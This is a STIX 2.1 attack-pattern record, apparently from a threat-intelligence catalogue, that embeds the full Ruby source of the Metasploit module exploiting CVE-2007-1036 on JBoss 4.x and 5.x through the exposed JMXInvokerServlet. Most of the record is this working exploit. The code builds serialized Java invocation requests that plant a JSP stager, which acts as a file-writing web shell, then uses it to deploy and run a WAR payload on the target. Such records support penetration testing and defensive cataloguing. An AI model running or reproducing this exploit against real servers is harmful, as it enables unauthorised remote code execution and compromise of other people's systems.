{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f8f3d587-1701-419e-9e8f-a5fe6eaf6097",
    "created": "2024-08-14T17:11:36.716575Z",
    "modified": "2024-08-14T17:11:36.716578Z",
    "name": "JBoss DeploymentFileRepository WAR Deployment (via JMXInvokerServlet)",
    "description": " This module can be used to execute a payload on JBoss servers that have an exposed HTTPAdaptor's JMX Invoker exposed on the \"JMXInvokerServlet\". By invoking the methods provided by jboss.admin:DeploymentFileRepository a stager is deployed to finally upload the selected payload to the target. The DeploymentFileRepository methods are only available on Jboss 4.x and 5.x. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/jboss_invoke_deploy.rb",
            "external_id": "jboss_invoke_deploy.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-1036"
        },
        {
            "source_name": "reference",
            "url": "http://www.redteam-pentesting.de/publications/jboss"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /JBoss/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'JBoss DeploymentFileRepository WAR Deployment (via JMXInvokerServlet)',\n      'Description' => %q{\n          This module can be used to execute a payload on JBoss servers that have an\n        exposed HTTPAdaptor's JMX Invoker exposed on the \"JMXInvokerServlet\". By invoking\n        the methods provided by jboss.admin:DeploymentFileRepository a stager is deployed\n        to finally upload the selected payload to the target. The DeploymentFileRepository\n        methods are only available on Jboss 4.x and 5.x.\n      },\n      'Author'      => [\n        'Patrick Hof', # Vulnerability discovery, analysis and PoC\n        'Jens Liebchen', # Vulnerability discovery, analysis and PoC\n        'h0ng10' # Metasploit module\n      ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2007-1036' ],\n          [ 'OSVDB', '33744' ],\n          [ 'URL', 'http://www.redteam-pentesting.de/publications/jboss' ],\n        ],\n      'DisclosureDate' => '2007-02-20',\n      'Privileged'  => true,\n      'Platform'    => %w{ java linux win },\n      'Stance'      => Msf::Exploit::Stance::Aggressive,\n      'Targets'     =>\n        [\n\n          # do target detection but java meter by default\n          [ 'Automatic',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'java'\n            }\n          ],\n\n          [ 'Java Universal',\n            {\n              'Arch' => ARCH_JAVA,\n            },\n          ],\n\n          #\n          # Platform specific targets\n          #\n          [ 'Windows Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            },\n          ],\n\n          [ 'Linux x86',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux'\n            },\n          ],\n        ],\n\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          Opt::RPORT(8080),\n          OptString.new('JSP',       [ false, 'JSP name to use without .jsp extension (default: random)', nil ]),\n          OptString.new('APPBASE',   [ false, 'Application base name, (default: random)', nil ]),\n          OptString.new('TARGETURI', [ true,  'The URI path of the invoker servlet', '/invoker/JMXInvokerServlet' ]),\n        ])\n\n  end\n\n  def check\n    res = send_serialized_request('version')\n    if res.nil?\n      vprint_error('Connection timed out')\n      return Exploit::CheckCode::Unknown\n    elsif res.code != 200\n      vprint_error(\"Unable to request version, returned http code is: #{res.code.to_s}\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    # Check if the version is supported by this exploit\n    return Exploit::CheckCode::Appears if res.body =~ /CVSTag=Branch_4_/\n    return Exploit::CheckCode::Appears if res.body =~ /SVNTag=JBoss_4_/\n    return Exploit::CheckCode::Appears if res.body =~ /SVNTag=JBoss_5_/\n\n    if res.body =~ /ServletException/ # Simple check, if we caused an exception.\n      vprint_status('Target seems vulnerable, but the used JBoss version is not supported by this exploit')\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    mytarget = target\n\n    if target.name =~ /Automatic/\n      mytarget = auto_target\n      fail_with(Failure::BadConfig, 'Unable to automatically select a target') unless mytarget\n      print_status(\"Automatically selected target: \\\"#{mytarget.name}\\\"\")\n    else\n      print_status(\"Using manually select target: \\\"#{mytarget.name}\\\"\")\n    end\n\n    # We use a already serialized stager to deploy the final payload\n    regex_stager_app_base = rand_text_alpha(14)\n    regex_stager_jsp_name = rand_text_alpha(14)\n    name_parameter = rand_text_alpha(8)\n    content_parameter = rand_text_alpha(8)\n    stager_uri = \"/#{regex_stager_app_base}/#{regex_stager_jsp_name}.jsp\"\n\n    replace_values = {\n      'regex_app_base' => regex_stager_app_base,\n      'regex_jsp_name' => regex_stager_jsp_name,\n      'jsp_code' => generate_stager(name_parameter, content_parameter)\n    }\n\n    print_status('Deploying stager')\n    send_serialized_request('installstager', replace_values)\n    print_status(\"Calling stager: #{stager_uri}\")\n    call_uri_mtimes(stager_uri, 5, 'GET')\n\n    # Generate the WAR with the payload which will be uploaded through the stager\n    app_base = datastore['APPBASE'] || rand_text_alpha(8+rand(8))\n    jsp_name = datastore['JSP'] || rand_text_alpha(8+rand(8))\n\n    war_data = payload.encoded_war({\n      :app_name => app_base,\n      :jsp_name => jsp_name,\n      :arch => mytarget.arch,\n      :platform => mytarget.platform\n    }).to_s\n\n    b64_war = Rex::Text.encode_base64(war_data)\n    print_status(\"Uploading payload through stager\")\n    res = send_request_cgi({\n      'uri'     => stager_uri,\n      'method'  => \"POST\",\n      'vars_post' =>\n      {\n        name_parameter => app_base,\n        content_parameter => b64_war\n      }\n    })\n\n    payload_uri = \"/#{app_base}/#{jsp_name}.jsp\"\n    print_status(\"Calling payload: \" + payload_uri)\n    res = call_uri_mtimes(payload_uri,5, 'GET')\n\n    # Remove the payload through  stager\n    print_status('Removing payload through stager')\n    delete_payload_uri = stager_uri + \"?#{name_parameter}=#{app_base}\"\n    res = send_request_cgi({'uri' => delete_payload_uri})\n\n    # Remove the stager\n    print_status('Removing stager')\n    send_serialized_request('removestagerfile', replace_values)\n    send_serialized_request('removestagerdirectory', replace_values)\n\n    handler\n  end\n\n  def generate_stager(name_param, content_param)\n    war_file = rand_text_alpha(4+rand(4))\n    file_content = rand_text_alpha(4+rand(4))\n    jboss_home = rand_text_alpha(4+rand(4))\n    decoded_content = rand_text_alpha(4+rand(4))\n    path = rand_text_alpha(4+rand(4))\n    fos = rand_text_alpha(4+rand(4))\n    name = rand_text_alpha(4+rand(4))\n    file = rand_text_alpha(4+rand(4))\n\n    stager_script = <<-EOT\n<%@page import=\"java.io.*,\n    java.util.*,\n    sun.misc.BASE64Decoder\"\n%>\n<%\nString #{file_content} = \"\";\nString #{war_file} = \"\";\nString #{jboss_home} = System.getProperty(\"jboss.server.home.dir\");\nif (request.getParameter(\"#{content_param}\") != null){\ntry {\n#{file_content} = request.getParameter(\"#{content_param}\");\n#{war_file} = request.getParameter(\"#{name_param}\");\nbyte[] #{decoded_content} = new BASE64Decoder().decodeBuffer(#{file_content});\nString #{path} = #{jboss_home} + \"/deploy/\" + #{war_file} + \".war\";\nFileOutputStream #{fos} = new FileOutputStream(#{path});\n#{fos}.write(#{decoded_content});\n#{fos}.close();\n}\ncatch(Exception e) {}\n}\nelse {\ntry{\nString #{name} = request.getParameter(\"#{name_param}\");\nString #{file} = #{jboss_home} + \"/deploy/\" + #{name} + \".war\";\nnew File(#{file}).delete();\n}\ncatch(Exception e) {}\n}\n\n%>\nEOT\n\n  end\n\n\n  def send_serialized_request(operation , replace_params = {})\n    data = ''\n    case operation\n    when 'version'\n      data = build_get_version.encode\n    when 'osname'\n      data = build_get_os.encode\n    when 'osarch'\n      data = build_get_arch.encode\n    when 'installstager'\n      data = build_install_stager(\n        war_name: replace_params['regex_app_base'],\n        jsp_name: replace_params['regex_jsp_name'],\n        data: replace_params['jsp_code']\n      ).encode\n    when 'removestagerfile'\n      data = build_delete_stager_file(\n        dir: \"#{replace_params['regex_app_base']}.war\",\n        file: replace_params['regex_jsp_name'],\n        extension: '.jsp'\n      ).encode\n    when 'removestagerdirectory'\n      data = build_delete_stager_file(\n        dir: './',\n        file: replace_params['regex_app_base'],\n        extension: '.war'\n      ).encode\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Unexpected operation\")\n    end\n\n    res = send_request_cgi({\n      'uri'     => normalize_uri(target_uri.path),\n      'method'  => 'POST',\n      'data'    => data,\n      'headers' =>\n        {\n          'ContentType:' => 'application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation',\n          'Accept' =>  'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2'\n        }\n    }, 25)\n\n\n    unless res && res.code == 200\n      print_error(\"Failed: Error requesting preserialized request #{operation}\")\n      return nil\n    end\n\n    res\n  end\n\n  def call_uri_mtimes(uri, num_attempts = 5, verb = nil, data = nil)\n    # JBoss might need some time for the deployment. Try 5 times at most and\n    # wait 5 seconds inbetween tries\n    num_attempts.times do |attempt|\n      if verb == \"POST\"\n        res = send_request_cgi(\n          {\n            'uri'    => uri,\n            'method' => verb,\n            'data'   => data\n          }, 5)\n      else\n        uri += \"?#{data}\" unless data.nil?\n        res = send_request_cgi(\n          {\n            'uri'    => uri,\n            'method' => verb\n          }, 30)\n      end\n\n      msg = nil\n      if res.nil?\n        msg = \"Execution failed on #{uri} [No Response]\"\n      elsif res.code < 200 || res.code >= 300\n        msg = \"http request failed to #{uri} [#{res.code}]\"\n      elsif res.code == 200\n        vprint_good(\"Successfully called '#{uri}'\")\n        return res\n      end\n\n      if attempt < num_attempts - 1\n        msg << ', retrying in 5 seconds...'\n        vprint_status(msg)\n        select(nil, nil, nil, 5)\n      else\n        print_error(msg)\n        return res\n      end\n    end\n  end\n\n\n  def auto_target\n    print_status('Attempting to automatically select a target')\n\n    plat = detect_platform\n    arch = detect_architecture\n\n    return nil unless arch && plat\n\n    # see if we have a match\n    targets.each { |t| return t if (t['Platform'] == plat) and (t['Arch'] == arch) }\n\n    # no matching target found\n    return nil\n  end\n\n  # Try to autodetect the target platform\n  def detect_platform\n    print_status('Attempting to automatically detect the platform')\n    res = send_serialized_request('osname')\n\n    if res.body =~ /(Linux|FreeBSD|Windows)/i\n      os = $1\n      if os =~ /Linux/i\n        return 'linux'\n      elsif os =~ /FreeBSD/i\n        return 'linux'\n      elsif os =~ /Windows/i\n        return 'win'\n      end\n    end\n    nil\n  end\n\n  # Try to autodetect the architecture\n  def detect_architecture\n    print_status('Attempting to automatically detect the architecture')\n    res = send_serialized_request('osarch')\n    if res.body =~ /(i386|x86)/i\n      arch = $1\n      if arch =~ /i386|x86/i\n        return ARCH_X86\n        # TODO, more\n      end\n    end\n    nil\n  end\n\n  def build_get_version\n    builder = Rex::Java::Serialization::Builder.new\n\n    object_array = builder.new_array(\n      values_type: 'java.lang.Object;',\n      values: [\n        builder.new_object(\n          name: 'javax.management.ObjectName',\n          serial: 0xf03a71beb6d15cf,\n          flags: 3,\n          annotations: [Rex::Java::Serialization::Model::EndBlockData.new]\n        ),\n        Rex::Java::Serialization::Model::Utf.new(nil, 'jboss.system:type=Server')\n      ],\n      name: '[Ljava.lang.Object;',\n      serial: 0x90ce589f1073296c,\n      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]\n    )\n\n    stream = Rex::Java::Serialization::Model::Stream.new\n    stream.contents = []\n    stream.contents << object_array\n    stream.contents << Rex::Java::Serialization::Model::EndBlockData.new\n    stream.contents << Rex::Java::Serialization::Model::Utf.new(nil, 'Version')\n\n    build_invocation(stream)\n  end\n\n  def build_get_os\n    builder = Rex::Java::Serialization::Builder.new\n\n    object_array = builder.new_array(\n        values_type: 'java.lang.Object;',\n        values: [\n          builder.new_object(\n            name: 'javax.management.ObjectName',\n            serial: 0xf03a71beb6d15cf,\n            flags: 3,\n            annotations: [Rex::Java::Serialization::Model::EndBlockData.new]\n          ),\n          Rex::Java::Serialization::Model::Utf.new(nil, 'jboss.system:type=ServerInfo')\n        ],\n        name: '[Ljava.lang.Object;',\n        serial: 0x90ce589f1073296c,\n        annotations: [Rex::Java::Serialization::Model::EndBlockData.new]\n    )\n\n    stream = Rex::Java::Serialization::Model::Stream.new\n    stream.contents = []\n    stream.contents << object_array\n    stream.contents << Rex::Java::Serialization::Model::EndBlockData.new\n    stream.contents << Rex::Java::Serialization::Model::Utf.new(nil, 'OSName')\n\n    build_invocation(stream)\n  end\n\n  def build_get_arch\n    builder = Rex::Java::Serialization::Builder.new\n\n    object_array = builder.new_array(\n      values_type: 'java.lang.Object;',\n      values: [\n        builder.new_object(\n          name: 'javax.management.ObjectName',\n          serial: 0xf03a71beb6d15cf,\n          flags: 3,\n          annotations: [Rex::Java::Serialization::Model::EndBlockData.new]\n        ),\n        Rex::Java::Serialization::Model::Utf.new(nil, 'jboss.system:type=ServerInfo')\n      ],\n      name: '[Ljava.lang.Object;',\n      serial: 0x90ce589f1073296c,\n      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]\n    )\n\n    stream = Rex::Java::Serialization::Model::Stream.new\n    stream.contents = []\n    stream.contents << object_array\n    stream.contents << Rex::Java::Serialization::Model::EndBlockData.new\n    stream.contents << Rex::Java::Serialization::Model::Utf.new(nil, 'OSArch')\n\n    build_invocation(stream)\n  end\n\n  def build_install_stager(opts = {})\n    war_name = \"#{opts[:war_name]}.war\"\n    jsp_name = opts[:jsp_name] || ''\n    extension = opts[:extension] || '.jsp'\n    data = opts[:data] || ''\n\n    builder = Rex::Java::Serialization::Builder.new\n\n    object_array = builder.new_array(\n      values_type: 'java.lang.Object;',\n      values: [\n        builder.new_object(\n          name: 'javax.management.ObjectName',\n          serial: 0xf03a71beb6d15cf,\n          flags: 3,\n          annotations: [Rex::Java::Serialization::Model::EndBlockData.new]\n        ),\n        Rex::Java::Serialization::Model::Utf.new(nil, 'jboss.admin:service=DeploymentFileRepository'),\n        Rex::Java::Serialization::Model::EndBlockData.new,\n        Rex::Java::Serialization::Model::Utf.new(nil, 'store')\n      ],\n      name: '[Ljava.lang.Object;',\n      serial: 0x90ce589f1073296c,\n      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]\n    )\n\n    values_array = builder.new_array(\n      values_type: 'java.lang.Object;',\n      values: [\n        Rex::Java::Serialization::Model::Utf.new(nil, war_name),\n        Rex::Java::Serialization::Model::Utf.new(nil, jsp_name),\n        Rex::Java::Serialization::Model::Utf.new(nil, extension),\n        Rex::Java::Serialization::Model::Utf.new(nil, data),\n        builder.new_object(\n          name: 'java.lang.Boolean',\n          serial: 0xcd207280d59cfaee,\n          annotations: [Rex::Java::Serialization::Model::EndBlockData.new],\n          fields: [['boolean', 'value']],\n          data: [['boolean', 0]]\n        )\n      ],\n      name: '[Ljava.lang.Object;',\n      serial: 0x90ce589f1073296c,\n      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]\n    )\n\n    types_array = builder.new_array(\n      values_type: 'java.lang.String;',\n      values: [\n        Rex::Java::Serialization::Model::Utf.new(nil, 'java.lang.String'),\n        Rex::Java::Serialization::Model::Utf.new(nil, 'java.lang.String'),\n        Rex::Java::Serialization::Model::Utf.new(nil, 'java.lang.String'),\n        Rex::Java::Serialization::Model::Utf.new(nil, 'java.lang.String'),\n        Rex::Java::Serialization::Model::Utf.new(nil, 'boolean')\n      ],\n      name: '[Ljava.lang.String;',\n      serial: 0xadd256e7e91d7b47,\n      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]\n    )\n\n    stream = Rex::Java::Serialization::Model::Stream.new\n    stream.contents = []\n    stream.contents << object_array\n    stream.contents << values_array\n    stream.contents << types_array\n\n    build_invocation_deploy(stream)\n  end\n\n  def build_delete_stager_file(opts = {})\n    dir = opts[:dir] || ''\n    file = opts[:file] || ''\n    extension = opts[:extension] || '.jsp'\n\n    builder = Rex::Java::Serialization::Builder.new\n\n    object_array = builder.new_array(\n      values_type: 'java.lang.Object;',\n      values: [\n        builder.new_object(\n          name: 'javax.management.ObjectName',\n          serial: 0xf03a71beb6d15cf,\n          flags: 3,\n          annotations: [Rex::Java::Serialization::Model::EndBlockData.new]\n        ),\n        Rex::Java::Serialization::Model::Utf.new(nil, 'jboss.admin:service=DeploymentFileRepository'),\n        Rex::Java::Serialization::Model::EndBlockData.new,\n        Rex::Java::Serialization::Model::Utf.new(nil, 'remove')\n      ],\n      name: '[Ljava.lang.Object;',\n      serial: 0x90ce589f1073296c,\n      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]\n    )\n\n    values_array = builder.new_array(\n      values_type: 'java.lang.Object;',\n      values: [\n        Rex::Java::Serialization::Model::Utf.new(nil, dir),\n        Rex::Java::Serialization::Model::Utf.new(nil, file),\n        Rex::Java::Serialization::Model::Utf.new(nil, extension)\n      ],\n      name: '[Ljava.lang.Object;',\n      serial: 0x90ce589f1073296c,\n      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]\n    )\n\n    types_array = builder.new_array(\n      values_type: 'java.lang.String;',\n      values: [\n      Rex::Java::Serialization::Model::Utf.new(nil, 'java.lang.String'),\n      Rex::Java::Serialization::Model::Utf.new(nil, 'java.lang.String'),\n      Rex::Java::Serialization::Model::Utf.new(nil, 'java.lang.String')\n      ],\n      name: '[Ljava.lang.String;',\n      serial: 0xadd256e7e91d7b47,\n      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]\n    )\n\n    stream = Rex::Java::Serialization::Model::Stream.new\n    stream.contents = []\n    stream.contents << object_array\n    stream.contents << values_array\n    stream.contents << types_array\n\n    build_invocation_deploy(stream)\n  end\n\n  def build_invocation(stream_argument)\n    stream = Rex::Java::Serialization::Model::Stream.new\n    stream.contents = []\n\n    null_stream = build_null_stream\n    null_stream_enc = null_stream.encode\n    null_stream_value = [null_stream_enc.length].pack('N')\n    null_stream_value << null_stream_enc\n    null_stream_value << \"\\xfb\\x57\\xa7\\xaa\"\n\n    stream_argument_enc = stream_argument.encode\n    stream_argument_value = [stream_argument_enc.length].pack('N')\n    stream_argument_value << stream_argument_enc\n    stream_argument_value << \"\\x7b\\x87\\xa0\\xfb\"\n\n    stream.contents << build_marshalled_invocation\n    stream.contents << Rex::Java::Serialization::Model::NullReference.new\n    stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, \"\\x97\\x51\\x4d\\xdd\\xd4\\x2a\\x42\\xaf\")\n    stream.contents << build_integer(647347722)\n    stream.contents << build_marshalled_value\n    stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, stream_argument_value)\n    stream.contents << Rex::Java::Serialization::Model::EndBlockData.new\n    stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, \"\\x00\\x00\\x00\\x01\")\n    stream.contents << build_invocation_key(5)\n    stream.contents << build_marshalled_value\n    stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, null_stream_value)\n    stream.contents << Rex::Java::Serialization::Model::EndBlockData.new\n    stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, \"\\x00\\x00\\x00\\x02\")\n    stream.contents << build_invocation_key(4)\n    stream.contents << build_invocation_type(1)\n    stream.contents << build_invocation_key(10)\n    stream.contents << Rex::Java::Serialization::Model::NullReference.new\n    stream.contents << Rex::Java::Serialization::Model::EndBlockData.new\n\n    stream\n  end\n\n  def build_invocation_deploy(stream_argument)\n    builder = Rex::Java::Serialization::Builder.new\n    stream = Rex::Java::Serialization::Model::Stream.new\n    stream.contents = []\n\n    null_stream = build_null_stream\n    null_stream_enc = null_stream.encode\n    null_stream_value = [null_stream_enc.length].pack('N')\n    null_stream_value << null_stream_enc\n    null_stream_value << \"\\xfb\\x57\\xa7\\xaa\"\n\n    stream_argument_enc = stream_argument.encode\n    stream_argument_value = [stream_argument_enc.length].pack('N')\n    stream_argument_value << stream_argument_enc\n    stream_argument_value << \"\\x7b\\x87\\xa0\\xfb\"\n\n    stream.contents << build_marshalled_invocation\n    stream.contents << Rex::Java::Serialization::Model::NullReference.new\n    stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, \"\\x78\\x94\\x98\\x47\\xc1\\xd0\\x53\\x87\")\n    stream.contents << build_integer(647347722)\n    stream.contents << build_marshalled_value\n    stream.contents << Rex::Java::Serialization::Model::BlockDataLong.new(nil, stream_argument_value)\n    stream.contents << Rex::Java::Serialization::Model::EndBlockData.new\n    stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, \"\\x00\\x00\\x00\\x01\")\n    stream.contents << build_invocation_key(5)\n    stream.contents << build_marshalled_value\n    stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, null_stream_value)\n    stream.contents << Rex::Java::Serialization::Model::EndBlockData.new\n    stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, \"\\x00\\x00\\x00\\x03\")\n    stream.contents << Rex::Java::Serialization::Model::Utf.new(nil, 'JMX_OBJECT_NAME')\n    stream.contents << builder.new_object(\n      name: 'javax.management.ObjectName',\n      serial: 0xf03a71beb6d15cf,\n      flags: 3,\n      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]\n    )\n    stream.contents << Rex::Java::Serialization::Model::Utf.new(nil, 'jboss.admin:service=DeploymentFileRepository')\n    stream.contents << Rex::Java::Serialization::Model::EndBlockData.new\n    stream.contents << build_invocation_key(4)\n    stream.contents << build_invocation_type(1)\n    stream.contents << build_invocation_key(10)\n    stream.contents << Rex::Java::Serialization::Model::NullReference.new\n    stream.contents << Rex::Java::Serialization::Model::EndBlockData.new\n\n    stream\n  end\n\n  def build_marshalled_invocation\n    builder = Rex::Java::Serialization::Builder.new\n    builder.new_object(\n      name: 'org.jboss.invocation.MarshalledInvocation',\n      serial: 0xf6069527413ea4be,\n      flags: Rex::Java::Serialization::SC_BLOCK_DATA | Rex::Java::Serialization::SC_EXTERNALIZABLE,\n      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]\n    )\n  end\n\n  def build_marshalled_value\n    builder = Rex::Java::Serialization::Builder.new\n    builder.new_object(\n      name: 'org.jboss.invocation.MarshalledValue',\n      serial: 0xeacce0d1f44ad099,\n      flags: Rex::Java::Serialization::SC_BLOCK_DATA | Rex::Java::Serialization::SC_EXTERNALIZABLE,\n      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]\n    )\n  end\n\n  def build_invocation_key(ordinal)\n    builder = Rex::Java::Serialization::Builder.new\n    builder.new_object(\n      name: 'org.jboss.invocation.InvocationKey',\n      serial: 0xb8fb7284d79385f9,\n      annotations: [Rex::Java::Serialization::Model::EndBlockData.new],\n      fields: [\n        ['int', 'ordinal']\n      ],\n      data:[\n        ['int', ordinal]\n      ]\n    )\n  end\n\n  def build_invocation_type(ordinal)\n    builder = Rex::Java::Serialization::Builder.new\n    builder.new_object(\n      name: 'org.jboss.invocation.InvocationType',\n      serial: 0x59a73a1ca52b7cbf,\n      annotations: [Rex::Java::Serialization::Model::EndBlockData.new],\n      fields: [\n        ['int', 'ordinal']\n      ],\n      data:[\n        ['int', ordinal]\n      ]\n    )\n  end\n\n  def build_integer(value)\n    builder = Rex::Java::Serialization::Builder.new\n    builder.new_object(\n      name: 'java.lang.Integer',\n      serial: 0x12e2a0a4f7818738,\n      annotations: [Rex::Java::Serialization::Model::EndBlockData.new],\n      super_class: builder.new_class(\n        name: 'java.lang.Number',\n        serial: 0x86ac951d0b94e08b,\n        annotations: [Rex::Java::Serialization::Model::EndBlockData.new]\n      ),\n      fields: [\n        ['int', 'value']\n      ],\n      data:[\n        ['int', value]\n      ]\n    )\n  end\n\n  def build_null_stream\n    stream = Rex::Java::Serialization::Model::Stream.new\n    stream.contents = [Rex::Java::Serialization::Model::NullReference.new]\n\n    stream\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-02-20",
    "x_mitre_platforms": [
        "linux"
    ]
}